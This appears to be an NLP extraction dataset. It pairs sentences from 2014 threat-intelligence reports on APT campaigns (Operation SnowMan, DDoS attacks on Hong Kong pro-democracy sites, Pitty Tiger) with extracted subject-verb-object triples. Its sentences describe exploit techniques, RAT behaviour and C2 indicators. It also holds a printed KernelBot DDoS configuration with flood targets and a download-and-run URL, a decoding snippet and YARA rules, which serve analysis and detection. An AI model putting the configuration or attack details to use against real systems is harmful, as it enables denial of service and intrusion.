bypass Windows\u2019 Address Space Layout Randomization (ASLR) protections, this exploit targets\ncomputers with any of the following configurations:\n<list>\n      Windows XP\n      Windows 7 and Java 1.6\n\f      Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010\n</list>\nUsers can mitigate the threat by upgrading from Windows XP and updating Java and Office": [{"targets": {"A": "targets", "S": "this exploit", "O": ["computers with any of the following configurations"]}, "bypass": {"A": "bypass", "S": "this exploit", "O": ["Windows\u2019 Address Space Layout Randomization (ASLR) protections"]}}], "\nFinally, it runs the file using the WinExec function": [{"runs": {"A": "runs", "S": "it", "O": ["the file", "using the WinExec function"]}}], " This PlugX variant connected to a Google Code project\nat code.google[.]com/p/udom/, where it decoded a command that configured its C2 server": [{"decoded": {"A": "decoded", "S": "it", "O": ["a command that configured its C2 server"]}}, {"connected": {"A": "connected", "S": "This PlugX variant", "O": ["to a Google Code project at code.google[.]com/p/udom/"]}}], "\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic": [{"flood": {"A": "flood", "S": "bots under their control", "O": ["124.217.214.149", "with UDP traffic"]}}, {"instructed": {"A": "instructed", "S": "a configuration update", "O": ["bots under their control"]}}, {"pushed": {"A": "pushed", "S": "the attackers", "O": ["a configuration update", "to four controls servers"]}}], " The following snippet of python\ncode can be used to decode this command:\n<code>\nb64encoded = request.content.rstrip('@$@').lstrip('@$@')\nb64decoded = b64encoded.decode(\"base64\")\n\n\ncommand = \"\"\n\n\nfor c in b64decoded:\n           x = ord(c)\n           x = x ^ XOR_key\n           command += chr(x)\n</code>\n\fFireEye has observed two different single-byte XOR keys used to encode configuration files issued by the\nDDOS C2 servers in this campaign": [{"encode": {"A": "encode", "S": "two different single-byte XOR keys", "O": ["configuration files issued by the DDOS C2 servers in this campaign"]}}], " This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com\nfor C2": [{"connected": {"A": "connected", "S": "This sample", "O": ["for C2", "to luxscena[.]com"]}}, {"is detected": {"A": "is detected", "O": ["as Backdoor.APT.Preshin", "This sample"]}}], "\n</section>\n<section>\n<heading>Ongoing DDoS Attacks Target the Pro-Democracy Movement</heading>\n\nFireEye has identified a number of binaries coded to receive instructions from a set of command and\ncontrol (C2) servers instructing participating bots to attack Next Media-owned websites and the\nHKGolden forum": [{"receive": {"A": "receive", "S": "a number of binaries", "O": ["instructions", "from a set of command and control (C2) servers"]}}, {"instructing": {"A": "instructing", "S": "a set of command and control (C2) servers", "O": ["participating bots", "to attack Next Media-owned websites and the HKGolden forum"]}}], "\n\nIn recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against\nwebsites promoting democracy in Hong Kong": [{"launched": {"A": "launched", "S": "attackers", "O": ["a series of Distributed Denial of Service attacks (DDoS)", "against websites promoting democracy in Hong Kong"]}}], " 23, 2014, two of the active controls began instructing participating bots to cease attacks": [{"instructing": {"A": "instructing", "S": "two of the active controls", "O": ["to cease attacks", "participating bots"]}}], "\nBoth of these certificates are valid but can be detected and blocked via the following Yara signatures:\n<code>\nrule callTogether_certificate\n{\n    meta:\n      author = \"Fireeye Labs\"\n      version = \"1.0\"\n      reference_hash = \"d08e038d318b94764d199d7a85047637\"\n      description = \u201cdetects binaries signed with the CallTogether certificate\u201d\n\f    strings:\n      $serial = {452156C3B3FB0176365BDB5B7715BC4C}\n      $o = \"CallTogether, Inc.\"\n    condition:\n      $serial and $o\n}\n\n\nrule qti_certificate\n{\n      meta:\n           author = \"Fireeye Labs\"\n           reference_hash = \"cfa3e3471430a0096a4e7ea2e3da6195\"\n           description = \"detects binaries signed with the QTI International Inc\ncertificate\"\n      strings:\n           $cn = \"QTI International Inc\"\n           $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }\n      condition:\n           $cn and $serial\n}\n</code>\nThese ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website": [{"target": {"A": "target", "S": "These ongoing DDoS attacks", "O": ["the hkgolden[.]com website"]}}], " These configurations issued commands to attack the following domains and\nIPs:\n<list>\nnxapi.appledaily.com[.]hk\n202.85.162.90\n58.64.139.10\n202.85.162.97\n202.85.162.81\n198.41.222.6\n202.85.162.101\n202.85.162.95\n202.85.162.180\n202.85.162.140\n202.85.162.130\n124.217.214.149\n</list>\nAll of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and\n124.217.214.149": [{"issued": {"A": "issued", "S": "These configurations", "O": ["commands to attack the following domains and IPs"]}}], " According to the Wall Street Journal, websites belonging to\nNext Media\u2019s Apple Daily publication have suffered from an ongoing DDoS attack that \u201cbrought down its\nemail system for hours\u201d": [{"suffered": {"A": "suffered", "S": "websites belonging to Next Media\u2019s Apple Daily publication", "O": ["from an ongoing DDoS attack that \u201cbrought down its email system for hours\u201d"]}}], " We also detect\nthis payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com": [{"detect": {"A": "detect", "S": "We", "O": ["as Backdoor.APT.PISCES", "this payload"]}}, {"connect": {"A": "connect", "S": "it", "O": ["to u.java-se[.]com"]}}], " 24, 2014, after attacking their own infrastructure,\nthe attackers issued new instructions to their botnet that ceased all attacks": [{"issued": {"A": "issued", "S": "the attackers", "O": ["new instructions", "to their botnet"]}}], " Structurally, all of\nthese samples are similar in that they drop three files:\n<list>\n\u2022          ctfmon.exe-a legitimate, signed copy of the Pidgin IM client\n           (md5 hash = 1685f978149d7ba8e039af9a4d5803c7)\n\u2022          libssp-0.dll\u2013malware DLL which is side-loaded by ctfmon.exe\n           to decode and launch KernelBot": [{"drop": {"A": "drop", "S": "they", "O": ["three files"]}}], " The encoded configuration\nfile shown above decodes to:\n<list>\n[KernelSetting]\nIsReportState=0\nIsDownFileRun0=0\nCmdID0=1\nDownFileRunUrl0=http://10.0.1.151/1.exe\n[UpdateServer]\nNewVersion=20140926\nUpdateFileUrl=http://10.0.1.151/1.exe\n[DDOS_HostStatistics]\nCountUrl=\nTimer=2\n[DDOS_ScriptFlood]\nIsScriptFlood=1\nCmdID=123\nScriptFloodDNS=\nScriptFloodUrl=http://nxapi.appledaily.com.hk/\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=0\nThreadLoopTime=5\nThreadCount=10\nTimer=360\nIsTimer=1\n[DDOS_ScriptFlood_A1]\nIsScriptFlood=0\nCmdID=1\nScriptFloodDNS=10.0.1.151\nScriptFloodUrl=10.0.1.151/1.html\nScriptFloodPort=80\nIsGetUrlFile=1\nIsSendPacket=1\nThreadLoopTime=1\nThreadCount=1\n\fTimer=20\nIsTimer=1\n[DDOS_UdpFlood]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_UdpFlood_A1]\nIsUdpFlood=0\nCmdID=1\nUdpFloodDNS=10.0.1.151\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_SynFlood]\nIsSynFlood=0\nCmdID=1\nSynFloodDNS=10.0.1.151\nSynFloodPort=80\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood]\nIsTcpFlood=0\nCmdID=1\nTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=1\nTimer=20\nIsTimer=1\n[DDOS_TcpFlood_A1]\nIsTcpFlood=0\nCmdID=1\n\fTcpFloodDNS=10.0.1.151\nTcpFloodPort=80\nIsSendPacket=1\nThreadCount=6\nTimer=20\nIsTimer=1\n</list>\nDuring the course of our research, we\u2019ve observed more than 30 different unique configuration files issued\nby the C2 servers listed above": [{"issued": {"A": "issued", "S": "the C2 servers listed above", "O": ["more than 30 different unique configuration files"]}}], "\nAs noted above, this site has been targeted with a DDoS attack by a KernelBot network": [{"been targeted": {"A": "been targeted", "S": "a KernelBot network", "O": ["with a DDoS attack", "this site"]}}], "\n\u2022          readme.txt \u2013 a binary file which contains the XOR-encoded\n           KernelBot DLL as well as C2 destination information (most have\n           md5 hash of b5ac964a74091d54e091e68cecd5b532)\n</list>\nThe KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the\nsample": [{"receive": {"A": "receive", "S": "The KernelBot implants", "O": ["from C2 servers hard-coded directly into the sample", "targeting instructions"]}}], " For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to\nboth www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com": [{"connects": {"A": "connects", "S": "a KernelBot variant", "O": ["to both www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com"]}}, {"drops": {"A": "drops", "S": "c3d6450075d618b1edba17ee723eb3ca", "O": ["a KernelBot variant"]}}], " We detect\nthis payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2": [{"detect": {"A": "detect", "S": "We", "O": ["this payload", "as Backdoor.APT.PISCES"]}}, {"used": {"A": "used", "S": "it", "O": ["hk.java-se[.]com", "for C2"]}}], "\n24, 2014, all five of the known active control servers were issuing commands to cease the attacks": [{"were issuing": {"A": "were issuing", "S": "all five of the known active control servers", "O": ["to cease the attacks", "commands"]}}], " Each sample we identified is signed with digital\ncertificates that have also been used by APT actors to sign binaries in previous intrusion operations:\n<figure></figure>\n\fThese binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as\nKernelBot ": [{"drop": {"A": "drop", "S": "These binaries", "O": ["a variant of an older DDoS tool known as KernelBot"]}}], " According to other reports, Next Media\u2019s network has suffered a \u201ctotal failure\u201d as\na result of these attacks": [{"suffered": {"A": "suffered", "S": "Next Media\u2019s network", "O": ["as a result of these attacks", "a \u201ctotal failure\u201d"]}}], " This particular variant called back to a command and control server located at\nnewss[.]effers[.]com": [{"called": {"A": "called", "S": "This particular variant", "O": ["back to a command and control server located at newss[.]effers[.]com"]}}], " Then,\nwhen the shellcode is executed, the malware creates files \u201csqlrenew.txt\u201d and \u201cstream.exe\u201d": [{"creates": {"A": "creates", "S": "the malware", "O": ["when the shellcode is executed", "files \u201csqlrenew.txt\u201d and \u201cstream.exe\u201d"]}}], " The attacker then overwrites the vftable\npointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP": [{"begin": {"A": "begin", "S": "The attacker", "O": ["ROP"]}, "overwrites": {"A": "overwrites", "S": "The attacker", "O": ["in memory", "to point to the pivot", "the vftable pointer of a flash.Media.Sound() object"]}}], " We also observed another \u201cHTTPS\u201d Gh0st variant connecting to\na related command and control server at me[.]scieron[.]com": [{"connecting": {"A": "connecting", "S": "another \u201cHTTPS\u201d Gh0st variant", "O": ["to a related command and control server at me[.]scieron[.]com"]}}], " The\nvulnerability allows the attacker to modify one byte of memory at an arbitrary address": [{"modify": {"A": "modify", "S": "the attacker", "O": ["at an arbitrary address", "one byte of memory"]}}], "<doc>\n<section>\n<heading>\nOperation SnowMan: DeputyDog Actor Compromises US Veterans of\nForeign Wars Website</heading>\nOn February 11, FireEye identified a zero-day exploit (CVE-2014-0322) being served up from the U.S": [{"being served up": {"A": "being served up", "O": ["a zero-day exploit (CVE-2014-0322)", "from the U.S. Veterans of Foreign Wars\u2019 website (vfw[.]org)"]}}], "\n</section>\n<section>\n<heading>ZxShell payload analysis</heading>\n\nAs documented above, this exploit dropped an XOR (0\u00d795) payload that executed a ZxShell backdoor\n(MD5: 8455bbb9a210ce603a1b646b0d951bce)": [{"dropped": {"A": "dropped", "S": "this exploit", "O": ["an XOR (0\u00d795) payload"]}}, {"executed": {"A": "executed", "S": "an XOR (0\u00d795) payload", "O": ["a ZxShell backdoor (MD5: 8455bbb9a210ce603a1b646b0d951bce)"]}}], "\n</section>\n<section>\n<heading>Infrastructure analysis</heading>\n\nThe info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous\nresolutions to the following IP addresses:\n<list>\n      58.64.200.178\n      58.64.200.179\n      103.20.192.4\n</list>\n<table>\nFirst Seen       Last Seen         CnC Domain           IP\n2013-08-31       2013-08-31        icybin.flnet[.]org   58.64.200.178\n2013-05-02       2013-08-02        info.flnet[.]org     58.64.200.178\n2013-08-02       2013-08-02        book.flnet[.]org     58.64.200.178\n2013-08-10       2013-08-10        info.flnet[.]org     58.64.200.179\n2013-07-15       2013-07-15        icybin.flnet[.]org   58.64.200.179\n2014-01-02       2014-01-02        book.flnet[.]org     103.20.192.4\n2013-12-03       2014-01-02        info.flnet[.]org     103.20.192.4\n</table>\nWe previously observed Gh0stRat samples with the custom packet flag \u201cHTTPS\u201d calling back to\nbook[.]flnet[.]org and icybin[.]flnet[.]org": [{"calling": {"A": "calling", "S": "Gh0stRat samples with the custom packet flag \u201cHTTPS\u201d", "O": ["back to book[.]flnet[.]org and icybin[.]flnet[.]org"]}}], "\n\nThe ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to\ncyber espionage operations": [{"used": {"A": "used", "S": "multiple threat actors linked to cyber espionage operations", "O": ["The ZxShell backdoor"]}}], " Specifically, visitors to the VFW website were\nsilently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html": [{"were silently redirected": {"A": "were silently redirected", "O": ["through an iframe", "visitors to the VFW website", "to the exploit at www.[REDACTED].com/Data/img/img.html"]}}], "\n</section>\n<section>\n<heading>Code execution</heading>\n\nOnce the attacker\u2019s code has full memory access through the corrupted Flash Vector object, the code\nsearches through loaded libraries gadgets by machine code": [{"searches": {"A": "searches", "S": "the code", "O": ["by machine code", "through loaded libraries gadgets", "Once the attacker\u2019s code has full memory access through the corrupted Flash Vector object"]}}], " \u201csqlrenew.txt\u201d is then executed with the LoadLibraryA\nWindows API call": [{"is then executed": {"A": "is then executed", "O": ["with the LoadLibraryA Windows API call", "\u201csqlrenew.txt\u201d"]}}], "\n</section>\n<section>\n<heading>ASLR bypass</heading>\n\nBecause the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use\nit to bypass ASLR": [{"use": {"A": "use", "S": "the attacker", "O": ["to bypass ASLR", "it"]}}, {"modify": {"A": "modify", "S": "attackers", "O": ["memory", "to an arbitrary address"]}}], " The attacker uses\nthe vulnerability to do the following:\n<list>\n      Gain access to memory from Flash ActionScript, bypassing address space layout randomization\n      (ASLR)\n      Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention\n      (DEP)\n</list>\n</section>\n\n\f\n<section>\n<heading>EMET detection</heading>\n\nThe attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file\npath to the EMET DLL": [{"uses": {"A": "uses", "S": "The attacker", "O": ["to load a one-line XML string containing a file path to the EMET DLL", "the Microsoft.XMLDOM ActiveX control"]}}], "\n\nYou may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked\nto both Operation DeputyDog and Operation Ephemeral Hydra": [{"were all linked": {"A": "were all linked", "O": ["to both Operation DeputyDog and Operation Ephemeral Hydra", "dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com"]}}], " government entities\n      Japanese firms\n      Defense industrial base (DIB) companies\n      Law firms\n      Information technology (IT) companies\n      Mining companies\n      Non-governmental organizations (NGOs)\n</list>\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day\nexploits against high-profile targets likely indicates that": [{"deploy": {"A": "deploy", "S": "this actor(s)", "O": ["against high-profile targets", "using zero-day exploits", "a number of different private and public RATs"]}}], "\n\fThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have\nsome identical functions with common typos, and even share the same name": [{"build": {"A": "build", "S": "They", "O": ["ROP chains"]}}], " The tail of the\nimage file is decoded, and written to these files": [{"is decoded, and written": {"A": "is decoded, and written", "O": ["to these files", "The tail of the image file"]}}], " It aborts exploitation if the user is browsing with a different\nversion of IE or has installed Microsoft\u2019s Experience Mitigation Toolkit (EMET)": [{"aborts": {"A": "aborts", "S": "It", "O": ["exploitation", "if the user is browsing with a different version of IE or has installed Microsoft\u2019s Experience Mitigation Toolkit (EMET)"]}}], "\n</section>\n<section>\n<heading>Shellcode analysis</heading>\n\nSubsequently, the malicious Flash code downloads a file containing the dropped malware payload": [{"downloads": {"A": "downloads", "S": "the malicious Flash code", "O": ["a file containing the dropped malware payload"]}}], "\n\nGiven the information above we can reasonably assume that this malware was most likely designed as a\nfirst stage implant": [{"designed": {"A": "designed", "S": "this malware", "O": ["as a first stage implant"]}}], " Once the payload text has been decrypted the malware treats this as a binary executable\nfile, which is then written to the disk and executed": [{"executed": {"A": "executed", "O": ["a binary executable file"]}, "written": {"A": "written", "O": ["to the disk", "a binary executable file"]}}], " With many pieces of\nmalware the initial communications that it sends out to its command and control server (known as\nbeaconing or phoning home) usually include pieces of information about the victim system": [{"sends out": {"A": "sends out", "S": "it", "O": ["the initial communications", "to its command and control server"]}}], " The first set of commands force the malware to behave\nas a simple downloader": [{"force": {"A": "force", "S": "The first set of commands", "O": ["to behave as a simple downloader", "the malware"]}}], "\n<figure></figure>\n\n\f(A screenshot showing the structure of the command and control routines within OrcaRAT)\n\nThe command and control structure is fairly simplistic but provides the operator with access to the victim\nmachine\u2019s filesystem and command line, and as such allows the attacker to perform various tasks such as\nexecuting arbitrary commands or uploading and downloading files from the compromised system": [{"executing": {"A": "executing", "O": ["arbitrary commands"]}}, {"provides": {"A": "provides", "S": "The command and control structure", "O": ["with access to the victim machine\u2019s filesystem and command line", "the operator"]}}, {"downloading": {"A": "downloading", "O": ["files", "from uploading files"]}, "uploading": {"A": "uploading", "O": ["files", "from downloading files"]}}], "\n\nAfter a command and control message is received, OrcaRAT sends an HTTP POST message back to the\ncommand and control server": [{"sends": {"A": "sends", "S": "OrcaRAT", "O": ["an HTTP POST message", "to the command and control server"]}}], " The randomly generated values noted above are actually used to encrypt several pieces of\ninformation that are extracted from the system, and even the key itself is included": [{"encrypt": {"A": "encrypt", "O": ["several pieces of information that are extracted from the system"]}}], " However, they also demonstrate the value of tracking\nthese threats over time, as this allowed us to uncover and properly attribute the new IOCs because Nitro\nwas still re-using": [{"re-using": {"A": "re-using", "S": "Nitro", "O": ["old C2 infrastructure", "with their new malware"]}}], "\n\nTable 7\n<table>\n SHA256         ffbddfb536e8e604c880ec977d06f804a500fc0396899bd2c195fb1f5b74207a\n MD5            a3b2e34973691ad320b70248bd67fbd2\n File Name      CitrixReceiverWeb.exe\n File Size      192512\n First Seen     2014-03-12 06:58:22\n C2 URL         zip.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nAs this post and previous cited research show, APT groups such as Nitro will continue to evolve their\ntechniques within the kill chain to avoid detection": [{"avoid": {"A": "avoid", "O": ["detection"]}}], "\n\nTable 4\n<table>\n SHA256        e7f2af8c48f837da57000c068368d77bc9b06eba1e077edfab58df6aa2ea40ec\n MD5           271e6a4d45c2817f86148ca413f97604\n File Name     mdm.exe\n File Size     118784\n First Seen    2014-05-20 08:43:15\n C2 URL        zipoo.redirectme[.]net\n Resolution    196.45.144.12\n</table>\nTable 5\n<table>\n SHA256         e601da16f923b33465dbafbff9d47195e8fc50099fd0581a16a1745bf890afb6\n MD5            be765cd5723e4366d35172aaf13fad44\n File Name      CitrixReceiverWeb.exe\n File Size      135168\n First Seen     2014-05-15 16:34:10\n C2 URL         zipoo.redirectme[.]net\n Resolution     196.45.144.12\n</table>\nThe malware dropped was configured to use good.myftp[.]org as the C2 URL, and the IP resolution was\n223.25.233.248": [{"use": {"A": "use", "S": "The malware", "O": ["good.myftp[.]org", "as the C2 URL"]}}], "\n\n    There are only two options we can think of here:\n       \uf0b7 Someone from the same company has been targeted with this document": [{"been targeted": {"A": "been targeted", "O": ["Someone from the same company", "with this document"]}}], " Usual RAT features are implemented:\n<list>\n       - File Download (GET) and Upload (PUT)\n       - Remote shell (ocmd/ccmd)\n       - Configuration update (cfg)\n       - Sleep (sleep)\n</list>\n</section>\n<section>\n    <heading>Version and author(s)</heading>\n\n    Regarding the configuration, our sample communicates with \u201csop.avstore.com.tw\u201d, and contains the\n    string \u201cNov 13 2013\u201d, which should be a version identifier": [{"communicates": {"A": "communicates", "S": "our sample", "O": ["with \u201csop.avstore.com.tw\u201d"]}}], " The IP addresses are in an ADSL dynamic pool:\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 41/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n                                  <caption>IP addresses used by the FLY-THINK machine</caption>\n\n\n\n    Most of the connections to the c&c server were coming from a computer named 50PZ80C-\n    1DFDCB8 with several IP addresses": [{"were coming": {"A": "were coming", "S": "Most of the connections to the c&c server", "O": ["from a computer named 50PZ80C- 1DFDCB8 with several IP addresses"]}}], "\n\n    Once this data has been transferred to the c&c server, it responds by sending additional malware to\n    execute on the machine": [{"been transferred": {"A": "been transferred", "O": ["to the c&c server", "this data"]}}, {"sending": {"A": "sending", "S": "it", "O": ["additional malware to execute on the machine"]}}], "\n\n    We have also been able to testify that the Pitty Tiger group has successfully collected information on\n    some of their targets by exploiting the HeartBleed<fn>1</fn> bug": [{"collected": {"A": "collected", "S": "the Pitty Tiger group", "O": ["information on some of their targets", "by exploiting the HeartBleed bug"]}}], "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    The binary we found is named 3200.exe<fn>1</fn>, and triggers the following alarms in our sandbox:\n\n<figure></figure>\n\n\n                          <caption>Alarms in our sandbox system, triggered by the Troj/Goldsun-B malware</caption>\n\n    The \u201crelease.tmp\u201d file is dropped on the system:\n\n\n\n<footnote>\n    1\n        MD5 hash: 728d6d3c98b17de3261eaf76b9c3eb7a\n        </footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 23/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                      <caption>File dropped by the malware in our sandbox</caption>\n\n    The binary is also copied to the user\u2019s \u201cApplication Data\u201d directory, and injects the \u201crelease.tmp\u201d file\n    in \u201cexplorer.exe\u201d": [{"is also copied": {"A": "is also copied", "O": ["to the user\u2019s \u201cApplication Data\u201d directory", "The binary"]}}, {"is dropped": {"A": "is dropped", "O": ["on the system", "The \u201crelease.tmp\u201d file"]}}, {"injects": {"A": "injects", "S": "The binary", "O": ["in \u201cexplorer.exe\u201d", "the \u201crelease.tmp\u201d file"]}}], " The\n    attackers have everything they need to start looking for an entry point to the company\u2019s network and\n    establish one or several permanent backdoors into the environment": [{"establish": {"A": "establish", "S": "The attackers", "O": ["one or several permanent backdoors", "into the environment"]}}], "\n\n    We also found a lot of vulnerability scanners launched by the attackers at different targets, yet there\n    was no sign of compromise": [{"launched": {"A": "launched", "S": "the attackers", "O": ["vulnerability scanners", "at different targets"]}}], "\n\n\n<figure></figure>\n\n                      <caption>Memory data leak from one server \u2013 Heartbleed exploit on one of PittyTiger\u2019s targets</caption>\n\n\n\n<footnote>\n    1\n        http://heartbleed.com/\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 10/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or\n    on several domains is a very noisy way to collect information and find server vulnerabilities": [{"collect": {"A": "collect", "O": ["information"]}}, {"Running": {"A": "Running", "O": ["on whole ranges of IP addresses used by the targets", "on several domains", "automated vulnerability scanners"]}}, {"find": {"A": "find", "O": ["server vulnerabilities"]}}], " A Hello packet is then sent:\n\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 24/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n<figure></figure>\n\n\n                                 <caption>Hello packet sent by Troj/Goldsun-B to its c&c server</caption>\n\n    The bot then repeatedly sends GET requests on \u201c/httpdocs/mm/<bot_id>/ComMand.sec\u201d to retrieve\n    remote commands": [{"retrieve": {"A": "retrieve", "S": "The bot", "O": ["remote commands"]}, "sends": {"A": "sends", "S": "The bot", "O": ["on \u201c/httpdocs/mm/<bot_id>/ComMand.sec\u201d", "GET requests"]}}, {"is then sent": {"A": "is then sent", "O": ["A Hello packet"]}}], "\n\n    They are quite unprofessional in their way of using their infrastructure: they do launch vulnerability\n    scanners directly from a c&c server and also use their connection for personal activities\n    (downloading pornographic material for example, as we have seen a whole folder on a c&c server\n    full of xxx torrent links)": [{"launch": {"A": "launch", "S": "they", "O": ["directly from a c&c server", "vulnerability scanners"]}}], "\n</section>\n<section>\n    <heading>Installation</heading>\n\n    Unsurprisingly, when running in our sandbox, the RAT triggers the same alarms as PittyTiger:\n\n<figure></figure>\n\n\n                                <caption>Alarms in our sandbox system, triggered by the CT RAT</caption>\n\n\n\n    The binary drops two files in \u201cC:\\Program Files\\Internet Explorer\u201d:\n\n\n<footnote>\n\n    1\n        MD5 hash: f65dc0b3eeb3c393e89ab49a3fac95a8\n</footnote>\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 19/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n                                      <caption>Files dropped by the CT RAT in our sandbox</caption>\n\n    The \u201cieupdate.exe\u201d is a simple binary to inject the DLL into \u201cexplorer.exe\u201d": [{"inject": {"A": "inject", "S": "The \u201cieupdate.exe\u201d", "O": ["the DLL", "into \u201cexplorer.exe\u201d"]}}, {"drops": {"A": "drops", "S": "The binary", "O": ["in \u201cC:\\Program Files\\Internet Explorer\u201d", "two files"]}}], "\n\n</section>\n<section>\n\n          <heading>ACCESS STRENGTHENING & LATERAL MOVES</heading>\n\n    Attackers have gained access to one or several machines inside the target\u2019s corporate network": [{"gained": {"A": "gained", "S": "Attackers", "O": ["access to one or several machines inside the target\u2019s corporate network"]}}], "\n\n    A computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5": [{"connected": {"A": "connected", "S": "A computer named CHMXY-PC", "O": ["with IP address 58.61.40.5", "via RDP", "to the c&c"]}}], "    Hong Kong              113.10.240.255                                                 12-16\n\n    Asia Data (hong   Hong Kong City,        101.1.17.0 -          101.1.25.74       zeng.skypetm.com.tw    Actually in use\n    Kong) Limited     Hong Kong              101.1.31.255\n\n    Isp Satellite     Hong Kong City,        202.174.130.0 -       202.174.130.110   ms11.skypetm.com.tw    2011-02-27/2013-\n    Broadband         Hong Kong              202.174.130.255                                                12-16\n    Provider\n\n    Jeongkyunghee     Anyang, South          221.144.0.0 -         221.150.164.114   link.skypetm.com.tw    2011-06-29/2012-\n                      Korea                  221.168.255.255                                                12-18\n\n\n</table>\n</section>\n<section>\n             <heading>COMMON CHARACTERISTICS BETWEEN THE TWO DOMAINS</heading>\n</section>\n<section>\n          <heading>Malware families and samples</heading>\n\n    Avstore.com.tw and skypetm.com.tw have 4 malware families in common, communicating to\n    subdomains of both domains:\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 35/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n<figure></figure>\n\n             <caption>Links between malware samples, IP addresses and c&cs associated to avstore.com.tw and skypetm.com.tw</caption>\n\n\n</section>\n<section>\n\n          <heading>OTHER DOMAINS LINKED WITH THE PITTY TIGER GROUP</heading>\n<table>\n    Domain                    Shares         with                             Comment\n\n    paccfic.com               Whois          acers.com.tw,\n                              information    foxcom.com.tw,\n                                              dopodo.com.tw,\n                                             stareastnet.com.tw\n\n\n    webconference.com.tw      Whois          techsun.com.tw\n                              information\n\n\n\n\n    <footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe Eye of the Tiger\u201d                         Page : 36/58\n\n                               Copyright \u00a9 2014 Airbus Defence & Space - All rights reserved</footer>\n<header>\fOperation Pitty Tiger \u2013 \u201cThe Eye of the Tiger\u201d</header>\n\n\n\n\n                          IP Address     techsun.com.tw,\n                                         trendmicro.org.tw\n\n\n\n    stareastnet.com.tw    Whois          acers.com.tw,                     Two PittyTiger malware and a CT RAT have been\n                          information    foxcom.com.tw,                    pointing to several stareastnet.com.tw subdomains": [{"communicating": {"A": "communicating", "S": "4 malware families"}}], " This e-mail spoofed the\n    identity of an employee of a targeted company:\n\n<figure>\n    From: XXXXXXX\n    To: XXXXXXX\n    File: 1 Attachment: Bird\u2019s Eye Point of View.doc\n\n\n    While the holiday season means clustering clustering \u2018time for a\n    vacation\u2019 for many, there are Those That Will Be of us staying home this\n    year": [{"spoofed": {"A": "spoofed", "S": "This e-mail", "O": ["the identity of an employee of a targeted company"]}}], "\n\n\n</section>\n<section>\n            <heading>DIRECT ATTACKS</heading>\n    Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on\n    the group\u2019s targets servers, we have been able to record several vulnerability scanning launched\n    from one c&c server straight to the targets": [{"launched": {"A": "launched", "O": ["from one c&c server", "vulnerability scanning", "straight to the targets"]}}], " It allowed the Pitty Tiger group to get admin credentials from at least one target, for\n    example": [{"get": {"A": "get", "S": "the Pitty Tiger group", "O": ["from at least one target", "admin credentials"]}}], "\n\n</section>\n\n\n\n<footer>\n    Public release\n    Threat Intelligence\n                                                 \u201cThe 